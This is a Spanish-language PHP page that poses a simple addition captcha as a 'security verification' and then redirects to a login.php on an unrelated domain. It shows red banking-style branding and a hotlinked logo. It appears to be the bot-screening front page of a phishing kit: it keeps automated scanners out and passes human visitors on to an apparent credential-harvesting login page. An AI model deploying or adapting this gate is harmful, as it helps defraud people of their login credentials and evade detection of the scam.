<?php
session_start();

$error = "";

// Link de redirección
$redirectUrl = "https://myfirststep.co.in/atnas/login.php";

// Generar operación matemática
if (!isset($_SESSION['num1']) || !isset($_SESSION['num2'])) {

    $_SESSION['num1'] = rand(1,9);
    $_SESSION['num2'] = rand(1,9);
}

// Verificación
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $correctAnswer = $_SESSION['num1'] + $_SESSION['num2'];

    if (isset($_POST['captcha']) && $_POST['captcha'] == $correctAnswer) {

        header("Location: " . $redirectUrl);
        exit;

    } else {

        $error = "Respuesta incorrecta.";

        $_SESSION['num1'] = rand(1,9);
        $_SESSION['num2'] = rand(1,9);
    }
}
?>

<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verificación de Seguridad</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{

    min-height:100vh;

    display:flex;
    justify-content:center;
    align-items:center;

    padding:15px;

    font-family:'Segoe UI',sans-serif;

    background:#ffffff;
}

.container{

    width:100%;
    max-width:400px;

    background:#ffffff;

    border-radius:28px;

    padding:32px 24px;

    text-align:center;

    border:1px solid #eee;

    box-shadow:
    0 10px 35px rgba(0,0,0,0.08);

    position:relative;

    overflow:hidden;
}

.container::before{

    content:"";

    position:absolute;

    top:0;
    left:0;

    width:100%;
    height:5px;

    background:
    linear-gradient(90deg,#ff0000,#ff4d4d,#b30000);
}

.logo img{

    width:120px;

    margin-bottom:20px;

    object-fit:contain;
}

h2{

    color:#b30000;

    font-size:28px;

    margin-bottom:10px;

    font-weight:700;
}

.description{

    color:#666;

    font-size:14px;

    line-height:1.6;

    margin-bottom:24px;
}

.verify-box{

    background:#fafafa;

    border:1px solid #eee;

    border-radius:20px;

    padding:22px;

    margin-bottom:18px;
}

.captcha{

    font-size:36px;

    font-weight:bold;

    color:#cc0000;

    margin-bottom:18px;
}

input{

    width:100%;

    padding:14px;

    border:1px solid #ddd;

    border-radius:14px;

    outline:none;

    font-size:15px;

    margin-bottom:15px;

    transition:0.3s;
}

input:focus{

    border-color:#ff0000;

    box-shadow:
    0 0 14px rgba(255,0,0,0.15);
}

button{

    width:100%;

    padding:14px;

    border:none;

    border-radius:14px;

    background:
    linear-gradient(135deg,#ff0000,#990000);

    color:white;

    font-size:15px;

    font-weight:600;

    cursor:pointer;

    transition:0.3s;
}

button:hover{

    transform:translateY(-2px);

    box-shadow:
    0 10px 24px rgba(255,0,0,0.25);
}

.error{

    margin-top:15px;

    background:#ffe5e5;

    color:#b30000;

    padding:12px;

    border-radius:12px;

    font-size:13px;

    border-left:4px solid #ff0000;
}

.footer{

    margin-top:24px;

    font-size:11px;

    color:#999;

    border-top:1px solid #eee;

    padding-top:15px;
}

.loading{

    display:inline-block;

    width:15px;
    height:15px;

    border:2px solid rgba(255,255,255,0.4);

    border-top-color:white;

    border-radius:50%;

    animation:spin 1s linear infinite;

    vertical-align:middle;

    margin-right:6px;
}

@keyframes spin{

    to{
        transform:rotate(360deg);
    }
}

</style>

</head>

<body>

<div class="container">

    <div class="logo">

        <img src="https://infonegocios.info/images/resize/41420.webp?fm=webp" alt="Logo">

    </div>

    <h2>Verificación</h2>

    <p class="description">
        Resuelve la operación matemática para continuar.
    </p>

    <form method="POST" id="verifyForm">

        <div class="verify-box">

            <div class="captcha">
                <?php echo $_SESSION['num1'] . " + " . $_SESSION['num2']; ?> = ?
            </div>

            <input 
                type="number"
                name="captcha"
                placeholder="Tu respuesta"
                required
            >

        </div>

        <?php if (!empty($error)) : ?>

            <div class="error">
                <?php echo htmlspecialchars($error); ?>
            </div>

        <?php endif; ?>

        <button type="submit" id="submitBtn">
            Continuar
        </button>

    </form>

    <div class="footer">

        Sistema de verificación segura

        <br><br>

        © 2026

    </div>

</div>

<script>

document.getElementById("verifyForm").addEventListener("submit", function(){

    let btn = document.getElementById("submitBtn");

    btn.disabled = true;

    btn.innerHTML =
    '<span class="loading"></span> Verificando...';
});

</script>

</body>
</html>